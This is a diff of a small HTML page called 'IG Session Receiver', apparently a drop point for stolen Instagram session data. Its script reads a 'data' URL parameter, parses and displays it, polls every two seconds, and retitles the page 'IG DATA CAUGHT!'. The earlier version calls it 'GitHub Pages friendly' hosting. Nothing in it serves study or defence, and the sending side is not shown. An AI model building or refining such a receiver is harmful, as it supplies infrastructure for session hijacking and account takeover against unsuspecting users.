@@ -1,23 +1,30 @@
 <!DOCTYPE html><html><head><title>IG Receiver</title></head><body style="font-family:monospace;background:#000;color:lime;padding:20px;">
-<h2>🕵️ IG Session Receiver</h2>
-<div id="status">Send test POST → data appears here!</div>
-<pre id="log">No data yet...</pre>
+<h2>🕵️ IG Session Receiver - LIVE</h2>
+<div id="status">Ready for data...</div>
+<pre id="log">Send data → appears here instantly!</pre>
 
 <script>
-// Simple GET-based receiver (GitHub Pages friendly)
-const urlParams = new URLSearchParams(window.location.search);
-if(urlParams.has('data')) {
-    const data = decodeURIComponent(urlParams.get('data'));
-    document.getElementById('log').textContent = data;
-    document.getElementById('status').innerHTML = '✅ DATA RECEIVED!';
+function checkData() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const data = urlParams.get('data');
+    if(data) {
+        try {
+            const parsed = JSON.parse(decodeURIComponent(data));
+            document.getElementById('log').textContent = JSON.stringify(parsed, null, 2);
+            document.getElementById('status').innerHTML = `✅ LIVE DATA (${new Date().toLocaleTimeString()})`;
+            document.title = 'IG DATA CAUGHT!';
+        } catch(e) {
+            document.getElementById('log').textContent = decodeURIComponent(data);
+            document.getElementById('status').innerHTML = '✅ RAW DATA RECEIVED';
+        }
+    }
 }
 
-// Auto-check URL params every 3s (for new data)
-setInterval(()=>{
-    const newData = new URLSearchParams(window.location.search).get('data');
-    if(newData && newData !== document.getElementById('log').textContent) {
-        document.getElementById('log').textContent = decodeURIComponent(newData);
-    }
-}, 3000);
+// Check on load + every 2s
+checkData();
+setInterval(checkData, 2000);
+
+// Debug: Show current URL params
+document.getElementById('status').innerHTML += ` | URL: ${window.location.search}`;
 </script>
 </body></html>
